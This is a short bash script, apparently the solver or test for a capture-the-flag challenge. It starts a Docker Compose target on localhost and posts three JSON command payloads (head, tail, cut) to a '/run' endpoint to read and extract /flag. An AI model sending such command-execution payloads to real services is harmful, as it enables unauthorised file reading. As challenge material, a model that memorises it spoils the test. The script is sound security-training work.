#!/bin/bash

if [ -n "$1" ]; then
    HOST="$1"
else
    HOST="http://localhost:3000/"
    RUN_DOCKER=1
fi

if [ -n "$RUN_DOCKER" ]; then
    docker compose build
    docker compose up -d
    sleep 5
fi

curl -s -d '{"command":["head","/flag"]}' "${HOST}run" | egrep -o 'flag{.*?}'
curl -s -d '{"command":["tail","/flag"]}' "${HOST}run" | egrep -o 'flag{.*?}'
curl -s -d '{"command":["cut","-c0-","/flag"]}' "${HOST}run" | egrep -o 'flag{.*?}'

if [ -n "$RUN_DOCKER" ]; then
  docker compose down
fi
